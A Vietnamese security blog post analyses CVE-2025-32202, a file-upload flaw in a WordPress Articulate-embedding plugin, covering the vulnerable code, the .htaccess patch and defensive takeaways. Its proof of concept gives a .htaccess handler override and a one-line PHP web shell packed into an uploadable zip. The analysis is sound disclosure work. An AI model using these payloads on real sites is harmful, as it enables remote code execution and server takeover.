# CVE-2025-32202 Analysis & POC


<!--more-->

## CVE & Basic Info
Lỗ hổng **Arbitrary File Upload** trong Brian Batt - elearningfreak.com đối với plugin **Insert or Embed Articulate Content into WordPress** cho phép tải lên một **Web Shell** lên máy chủ web. Vấn đề này ảnh hưởng đến **Insert or Embed Articulate Content into WordPress**: từ **n/a** đến **4.3000000025**.

* **CVE ID**: [CVE-2025-32202](https://www.cve.org/CVERecord?id=CVE-2025-32202)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: <= 4.3000000025
* **Patched Versions**: 4.3000000026
* **CVSS severity**: Medium (9.1)
* **Required Privilege**: Editor
* **Product**: [WordPress Embed Articulate Content into WordPress Plugin](https://wordpress.org/plugins/insert-or-embed-articulate-content-into-wordpress/)

## Requirements

* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Embed Articulate Content into WordPress**:  
    * `4.3000000025` – **vulnerable**  
    * `4.3000000026` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause

Lỗ hổng nằm trong hàm `articulate_has_php_file()` tại `/wp-content/plugins/insert-or-embed-articulate-content-into-wordpress/functions.php` do kiểm tra không đầy đủ, cho phép attacker tải lên file `.htaccess` nhằm ghi đè cơ chế xử lý trong thư mục upload; kết quả là các file upload sau đó với phần mở rộng do attacker đặt (ví dụ `.abc`, `.xnxx`) có thể thực thi như file PHP.

![Add .htaccess](add_check.png "Thêm điều kiện kiểm tra .htaccess")

Bản vá đã thêm điều kiện check `.htaccess` khi upload file giúp ngăn chặn lỗ hổng xảy ra.

## Code Analysis
Plugin đã đăng ký một action hook dành cho người dùng đã đăng nhập

```php
add_action( 'wp_ajax_articulate_upload_file', 'articulate_upload_ajax_file' );
```

Tức khi truy cập endpoint `/wp-admin/admin-ajax.php` với param `action=articulate_upload_file` thì callback `articulate_upload_ajax_file` được gọi

```php {title="functions.php" data-open=true hl_lines=[109]}
function articulate_upload_ajax_file() {
	articulate_setup_php_ini();
	check_ajax_referer( 'articulate_upload_file' );

	if ( ! is_user_logged_in() || ! current_user_can( 'upload_files' ) || ! current_user_can( 'unfiltered_html' ) ) {
		die(
			json_encode(
				array(
					'OK'   => 0,
					'info' => __( 'You do not have permissions to upload this file. Contact your admin to get the unfiltered_html capability.', 'insert-or-embed-articulate-content-into-wordpress' ),
				)
			)
		);
	}

	$count_dirs = getDirs();
	// you can use WP's wp_handle_upload() function:
	$file = $_FILES['async-upload'];
	$dir  = untrailingslashit( getUploadsPath() );

	if ( empty( $_FILES ) || $_FILES['async-upload']['error'] ) {
		die(
			json_encode(
				array(
					'OK'   => 0,
					'info' => __(
						'Failed to move uploaded file.  Please check if the folder has write permissions.',
						'insert-or-embed-articulate-content-into-wordpress'
					),
				)
			)
		);
	}
	$chunk    = isset( $_REQUEST['chunk'] ) ? intval( $_REQUEST['chunk'] ) : 0;
	$chunks   = isset( $_REQUEST['chunks'] ) ? intval( $_REQUEST['chunks'] ) : 0;
	$fileName = isset( $_REQUEST['name'] ) ? sanitize_file_name( $_REQUEST['name'] ) : sanitize_file_name( $_FILES['async-upload']['name'] );
	$filePath = '' . $dir . '/' . sanitize_file_name( $fileName ) . '';
	// Open temp file
	$out = @fopen( "{$filePath}.part", $chunk == 0 ? 'wb' : 'ab' );
	if ( $out ) {
		// Read binary input stream and append it to temp file
		$in = @fopen( $_FILES['async-upload']['tmp_name'], 'rb' );
		if ( $in ) {
			while ( $buff = fread( $in, 4096 ) ) {
				fwrite( $out, $buff );
			}
		} else {
			die(
				json_encode(
					array(
						'OK'   => 0,
						'info' => __(
							'Failed to open input stream. Please check if the folder has write permissions',
							'insert-or-embed-articulate-content-into-wordpress'
						),
					)
				)
			);
		}
		@fclose( $in );
		@fclose( $out );
		@unlink( $_FILES['async-upload']['tmp_name'] );
	} else {
		die(
			json_encode(
				array(
					'OK'   => 0,
					'info' => __(
						'Failed to open output stream.  Please check if the folder has write permissions',
						'insert-or-embed-articulate-content-into-wordpress'
					),
				)
			)
		);
	}

	// Security check.
	$mime  = wp_check_filetype( $filePath );
	$mimes = get_allowed_mime_types( get_current_user_id() );
	if ( ! isset( $mime['type'] ) || ! in_array( $mime['type'], array_values( $mimes ) ) ) {
		die(
			json_encode(
				array(
					'OK'   => 0,
					'info' => __(
						'Failed to upload this file for security reasons. Contact your admin to ensure your user can access all mime types from get_allowed_mime_types.',
						'insert-or-embed-articulate-content-into-wordpress'
					),
				)
			)
		);
	}

	// Check if file has been uploaded
	if ( ! $chunks || $chunk == $chunks - 1 ) {
		// Strip the temp .part suffix off
		articulate_custom_rename( "{$filePath}.part", $filePath );
		// start extracting
		// unzip file
		$dir    = explode( '.', $fileName );
		$dir[0] = str_replace( ' ', '_', $dir[0] );
		$target = getUploadsPath() . $dir[0];
		$file   = $filePath;
		while ( file_exists( $target ) ) {
			$r       = rand( 1, 10 );
			$target .= $r;
			$dir[0] .= $r;
		}
		$arr = extractZip( $file, $target, $dir[0] );
		unlink( $filePath );
		do_action( hook_name: 'iea/uploaded_quiz', $arr, $target );
		$ok       = isset( $arr[4] ) ? $arr[4] : 0;
		$response = array(
			'OK'     => $ok,
			'info'   => $arr[0],
			'folder' => $arr[2],
			'path'   => $arr[1],
			'name'   => $arr[3],
			'target' => $target,
		);
		die( json_encode( $response ) );
	} else {
		die(
			json_encode(
				array(
					'OK'   => 1,
					'info' => __(
						'Uploading chunks!',
						'insert-or-embed-articulate-content-into-wordpress'
					),
				)
			)
		);
	}
	exit;
};
```

Hàm `articulate_upload_ajax_file()` xử lý upload file qua AJAX cho plugin. Cụ thể:

1. Khởi tạo & bảo mật cơ bản

```php
articulate_setup_php_ini();
check_ajax_referer( 'articulate_upload_file' );
```

* `articulate_setup_php_ini()` — chỉnh các setting PHP (thường để cho phép upload lớn hơn, timeout...).
* `check_ajax_referer()` — kiểm tra nonce để ngăn CSRF.

2. Kiểm tra quyền người dùng

```php
if ( ! is_user_logged_in() || ! current_user_can( 'upload_files' ) || ! current_user_can( 'unfiltered_html' ) ) {
    die(json_encode([...]));
}
```

* Chỉ cho user đã đăng nhập và có capability `upload_files` và `unfiltered_html` thực hiện upload (Editor trở lên).
* Nếu không đủ quyền, trả về JSON lỗi và dừng.

3. Lấy thông tin file và đường dẫn lưu

```php
$count_dirs = getDirs();
$file = $_FILES['async-upload'];
$dir  = untrailingslashit( getUploadsPath() );
```

* `$_FILES['async-upload']` là file upload từ client.
* `getUploadsPath()` trả về thư mục gốc để lưu (custom của plugin); `untrailingslashit()` bỏ dấu `/` cuối.

4. Kiểm tra lỗi upload ban đầu

```php
if ( empty( $_FILES ) || $_FILES['async-upload']['error'] ) {
    die(json_encode([...]));
}
```

* Nếu không có file hoặc có lỗi (upload error code), trả về lỗi.

5. Xử lý chunked upload và đặt tên file

```php
$chunk    = isset( $_REQUEST['chunk'] ) ? intval( $_REQUEST['chunk'] ) : 0;
$chunks   = isset( $_REQUEST['chunks'] ) ? intval( $_REQUEST['chunks'] ) : 0;
$fileName = isset( $_REQUEST['name'] ) ? sanitize_file_name( $_REQUEST['name'] ) : sanitize_file_name( $_FILES['async-upload']['name'] );
$filePath = '' . $dir . '/' . sanitize_file_name( $fileName ) . '';
```

* Hỗ trợ upload theo mảnh (chunked). `chunk` là index hiện tại, `chunks` tổng số mảnh.
* `sanitize_file_name()` làm sạch tên file để tránh ký tự nguy hiểm.
* `filePath` là đường dẫn file đích (trong thư mục upload của plugin).

6. Mở file `.part` và ghi dữ liệu (append hoặc write)

```php {data-open=true}
$out = @fopen( "{$filePath}.part", $chunk == 0 ? 'wb' : 'ab' );
if ( $out ) {
    $in = @fopen( $_FILES['async-upload']['tmp_name'], 'rb' );
    if ( $in ) {
        while ( $buff = fread( $in, 4096 ) ) {
            fwrite( $out, $buff );
        }
    } else { die(...); }
    @fclose( $in );
    @fclose( $out );
    @unlink( $_FILES['async-upload']['tmp_name'] );
} else { die(...); }
```

* Mở file tạm `{$filePath}.part`: nếu `chunk == 0` mở để ghi mới (`wb`), còn nếu là chunk tiếp theo mở append (`ab`).
* Đọc file tạm PHP (`tmp_name`) và ghi vào file `.part` theo từng block 4096 bytes.
* Sau ghi, đóng file và xóa file tạm của PHP.

7. Kiểm tra MIME/type theo file extension

```php
$mime  = wp_check_filetype( $filePath );
$mimes = get_allowed_mime_types( get_current_user_id() );
if ( ! isset( $mime['type'] ) || ! in_array( $mime['type'], array_values( $mimes ) ) ) {
    die(json_encode([...]));
}
```

* `wp_check_filetype( $filePath )` dựa trên tên/đuôi file để trả về MIME (không kiểm tra nội dung nhị phân).
* `get_allowed_mime_types( $user_id )` trả về danh sách MIME được phép cho user hiện tại.
* Nếu MIME không nằm trong danh sách cho phép thì trả về lỗi bảo mật.

8. Khi tất cả chunk đã được upload (hoàn tất)

```php {data-open=true}
if ( ! $chunks || $chunk == $chunks - 1 ) {
    articulate_custom_rename( "{$filePath}.part", $filePath );
    $dir    = explode( '.', $fileName );
    $dir[0] = str_replace( ' ', '_', $dir[0] );
    $target = getUploadsPath() . $dir[0];
    $file   = $filePath;
    while ( file_exists( $target ) ) {
        $r       = rand( 1, 10 );
        $target .= $r;
        $dir[0] .= $r;
    }
    $arr = extractZip( $file, $target, $dir[0] );
    unlink( $filePath );
    do_action( hook_name: 'iea/uploaded_quiz', $arr, $target );
    ...
    die( json_encode( $response ) );
} else {
    die(json_encode(['OK'=>1,'info'=>'Uploading chunks!']));
}
```

* Nếu không dùng chunking hoặc chunk hiện tại là chunk cuối cùng thì:

  * `articulate_custom_rename()` đổi tên file `.part` -> file thực.
  * Chuẩn bị `target` (folder) dựa trên tên file (phần trước dấu `.`) — dùng làm thư mục giải nén.
  * Nếu `target` đã tồn tại thì nối số ngẫu nhiên để tránh ghi đè.
  * Gọi `extractZip($file, $target, $dir[0])` để giải nén file vào `target`. (Hàm này có thể xử lý ZIP; logic tùy plugin.)
  * Xóa file zip gốc bằng `unlink($filePath)`.
  * Gọi hook `iea/uploaded_quiz` để plugin/third-party xử lý tiếp.
  * Trả về JSON phản hồi với các thông tin (OK, folder, path, name, target).
* Nếu vẫn còn chunk đang upload thì trả về JSON thông báo đang upload.

---

```php {title="functions.php" data-open=true hl_lines=[10]}
function extractZip( $fileName, $target, $dir ) {
	add_filter( 'admin_memory_limit', 'articulate_run_admin_memory_limit_hook', 100, 1 );
	// admin_memory_limit hook is called in wp_raise_memory_limit function that is called in unzip_file function.
	$arr      = array();
	$unzipper = new Quiz_Unzip( true );
	$unzip    = $unzipper->unzip_file( $fileName, $target );

	if ( $unzip ) {
		wp_ajax_quiz_check_folder( $target );
		if ( articulate_has_php_file( $target ) ) {
			$arr[0] = '<span style="color:red">' . sprintf( __( 'ZIP upload successful, but we found a PHP file that is not allowed in your content directory. Contact support at %s', 'insert-or-embed-articulate-content-into-wordpress' ), '<a style="color: black" target="_blank" href="https://www.elearningfreak.com/upload-file/">www.elearningfreak.com</a>' ) . '</span>';
			articulate_rrmdir( $target );
			$arr[4] = 0;// OK = 0
			$arr[1] = '';
			$arr[2] = $dir;
			$arr[3] = '';
		} else {

			$file   = getFile( $target, true );// true to get return value as an array of detail
			$arr[0] = 'Upload Complete!';
			if ( $file['status'] == 'valid_html_file_found' || $file['status'] == 'index_html_file_found' || $file['status'] == 'other_html_file_found' ) {
				$arr[0] = __( 'Upload Complete!', 'insert-or-embed-articulate-content-into-wordpress' );
				$arr[4] = 1;// OK = 1
			} elseif ( $file['status'] == 'no_html_file_found' ) {
				$arr[0] = '<span style="color:black">' . sprintf( __( 'ZIP upload successful, but we were unable to find an HTML file. Either increase your WP_MEMORY_LIMIT, define your FS_METHOD as DIRECT, or contact support at %s', 'insert-or-embed-articulate-content-into-wordpress' ), '<a style="color: black" target="_blank" href="https://www.elearningfreak.com/upload-file/">www.elearningfreak.com</a>' ) . '</span>';
				articulate_rrmdir( $target );
				$arr[4] = 0;// OK = 0
			}

			$arr[1] = getUploadsUrl() . $dir . '/' . $file['file_name'];
			$arr[2] = $dir;
			$arr[3] = $file;
		}
	} else {
		$arr[0] = __( 'File upload failed', 'insert-or-embed-articulate-content-into-wordpress' );
		$arr[4] = 0;// OK = 0
	}
	return $arr;
}
```

Hàm `extractZip()` xử lý **giải nén file ZIP** sau khi người dùng upload, đồng thời **kiểm tra an toàn** (cụ thể là không chứa file PHP, PHTML, PHAR), và trả về thông tin kết quả dạng mảng `$arr`. Cụ thể:

1. Thực hiện giải nén

```php
$unzipper = new Quiz_Unzip( true );
$unzip    = $unzipper->unzip_file( $fileName, $target );
```

* Tạo đối tượng `Quiz_Unzip` (có thể là wrapper quanh `unzip_file()` của WordPress).
* Thực hiện giải nén `$fileName` vào thư mục `$target`.
* `$unzip` trả về **true** nếu giải nén thành công.

2. Kiểm tra có file PHP nguy hiểm không

```php
if ( articulate_has_php_file( $target ) ) {
    ...
}
```

* Gọi hàm `articulate_has_php_file()` để **quét toàn bộ thư mục giải nén** xem có chứa file `.php`, `.phtml`, `.phar` hay không.
```php {data-open=true hl_lines=[10,11,12]}
function articulate_has_php_file( $dir ) {
    $dir = rtrim( $dir, '/' );
    if ( is_dir( $dir ) ) {

        $dir_handle = opendir( $dir );
        if ( $dir_handle ) {
            while ( $file = readdir( $dir_handle ) ) {
                if ( $file != '.' && $file != '..' ) {
                    if ( !is_dir( $dir . '/' . $file ) &&
                        (strpos($file, '.phtml') !== false ||
                         strpos($file, '.php') !== false && $file != 'relay.php' ||
                         strpos($file, '.phar') !== false) ) { // Added condition for .phar files
                        return true;
                    } else {
                        $found = articulate_has_php_file( $dir . '/' . $file );
                        if ( $found ) {
                            return true;
                        }
                    }
                }
            }
            closedir( $dir_handle );
        }

        return false;
    }
    return false;
}
```

> [!BUG]
> Ngoài `.phtml`, `.php`, `.phar` ta có thể dùng `.htaccess` nhằm ghi đè cơ chế xử lý trong thư mục upload; kết quả là các file upload sau đó với phần mở rộng do attacker đặt (ví dụ `.abc`, `.xnxx`) có thể thực thi như file PHP.
> ```.htaccess
> <IfModule mod_php.c>
>    <Files "*.abc">
>        SetHandler application/x-httpd-php
>    </Files>
> </IfModule>
> ```

**Nếu có file nguy hiểm:**

```php
$arr[0] = '<span style="color:red">ZIP upload successful, but we found a PHP file...</span>';
articulate_rrmdir( $target ); // Xóa toàn bộ thư mục
$arr[4] = 0;
$arr[1] = '';
$arr[2] = $dir;
$arr[3] = '';
```

* Báo lỗi cho người dùng.
* Gọi `articulate_rrmdir()` để **xóa toàn bộ thư mục đã giải nén** (đề phòng file độc).
* Đặt `OK = 0` (thất bại).

**Nếu KHÔNG có file PHP nguy hiểm:**

```php
$file = getFile( $target, true ); // Lấy thông tin file chính (HTML)
```

* Hàm `getFile()` tìm file HTML chính (điểm bắt đầu của nội dung Articulate).
* Kiểm tra trạng thái của file HTML tìm thấy.

```php
if ( $file['status'] == 'valid_html_file_found' || ...) {
    $arr[4] = 1; // OK = 1
} elseif ( $file['status'] == 'no_html_file_found' ) {
    articulate_rrmdir( $target ); // Xóa thư mục nếu không có file HTML
    $arr[4] = 0;
}
```

3. Trả về thông tin kết quả

```php
$arr[1] = getUploadsUrl() . $dir . '/' . $file['file_name'];
$arr[2] = $dir;
$arr[3] = $file;
return $arr;
```

* `$arr` chứa thông tin như:

  * `$arr[0]`: thông điệp
  * `$arr[1]`: URL file
  * `$arr[2]`: thư mục
  * `$arr[3]`: thông tin chi tiết file
  * `$arr[4]`: trạng thái thành công/thất bại (OK)


## Flow
{{< mermaid >}}
graph TD

A["POST /wp-admin/admin-ajax.php?action=articulate_upload_file"] --> B["articulate_upload_ajax_file()"]
B --> C{"check_ajax_referer('articulate_upload_file') valid?"}
C -- No --> Z["Return JSON error"]
C -- Yes --> D{"User has 'upload_files' && 'unfiltered_html'?"}
D -- No --> Z
D -- Yes --> E["Handle uploaded file → save to {$filePath}.part"]
E --> F["Combine chunks & rename → articulate_custom_rename('{$filePath}.part', $filePath)"]
F --> G["extractZip($filePath, $target, $dir)"]
G --> H["Quiz_Unzip->unzip_file($filePath, $target)"]
H --> I{"articulate_has_php_file($target) detect .php/.phtml/.phar ?"}
I -- Yes --> J["articulate_rrmdir($target) → delete folder → return error"]
I -- No --> K["(❌ Missing check for .htaccess file)"]
K --> L["Attacker uploads ZIP containing .htaccess"]
L --> M[".htaccess overrides Apache handler in upload dir"]
M --> N["Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP"]
N --> O["→ Arbitrary File Upload → Remote Code Execution (RCE)"]

%% Patch branch
K --> P["✅ [Patched] articulate_has_php_file() adds '.htaccess' check"]
P --> Q["Upload blocked if .htaccess detected"]

{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo cấu trúc thư mục sau:

```sh
bypass
.
├── .htaccess
├── index.html
└── rce.abc
```

* `.htaccess`

```.htaccess
<IfModule mod_php.c>
    <Files "*.abc">
        SetHandler application/x-httpd-php
    </Files>
</IfModule>
```
Tạo rule, có thể upload file `.abc` trong thư mục hiện tại và thư mục con. Khiến nó thực thi như file `.php`

* `rce.abc`

Chứa web shell

```php
<?php system($_REQUEST["cmd"]) ?>
```

2. Nén thư mục lại thành file `.zip`

```sh
zip -r bypass.zip bypass
```

3. Upload file zip vừa tạo

![e-Elearning](widget.png "Widget của plugin trong tạo post")

> [!INFO]
> Đây là chức năng được môt tả trong document của plugin, ta tạo post rồi thêm widget này sau đó thực hiện upload zip file
> ![Block](block.png "Widget e-Elearning")

Request và Response trong BurpSuite:

![Request và Response trong BurpSuite](re_rs.png "Request và Response trong BurpSuite")

4. RCE với web shell

![Result](result.png "RCE với file upload")

## Conclusion

Lỗ hổng **CVE-2025-32202** phát sinh do plugin **Insert or Embed Articulate Content into WordPress** kiểm tra không đầy đủ loại file được giải nén, bỏ sót trường hợp `.htaccess`. Điều này cho phép attacker có quyền **Editor** tải lên một file `.htaccess` để ghi đè cơ chế xử lý file trong thư mục upload. Kết quả là các file được tải lên sau đó, dù có phần mở rộng tùy ý (như `.abc`, `.xyz`), vẫn có thể được xử lý như file PHP, dẫn đến **Remote Code Execution (RCE)**.
Bản vá **4.3000000026** đã bổ sung kiểm tra đối với `.htaccess`, ngăn chặn việc ghi đè handler trong thư mục upload và loại bỏ khả năng khai thác này.

## Key Takeaway

* Cần kiểm tra chặt chẽ mọi loại file có thể ảnh hưởng đến hành vi máy chủ, đặc biệt là `.htaccess`
* Không chỉ dựa vào phần mở rộng file; cần xác thực cả MIME type và nội dung thực tế của file.
* Không nên cho phép người dùng, kể cả tài khoản có quyền Editor, tải lên file nén chứa nội dung có thể thực thi.
* Cần tách biệt rõ ràng thư mục upload của người dùng khỏi thư mục có thể thực thi PHP.
* Thường xuyên kiểm tra và cập nhật plugin; các lỗi nhỏ trong cơ chế lọc file có thể dẫn tới RCE nghiêm trọng.

## References

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[ WordPress Insert or Embed Articulate Content into WordPress Plugin <= 4.3000000025 is vulnerable to Arbitrary File Upload ](https://patchstack.com/database/wordpress/plugin/insert-or-embed-articulate-content-into-wordpress/vulnerability/wordpress-insert-or-embed-articulate-content-into-wordpress-plugin-4-3000000025-arbitrary-file-upload-vulnerability)   

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-12-cve-2025-32202/  

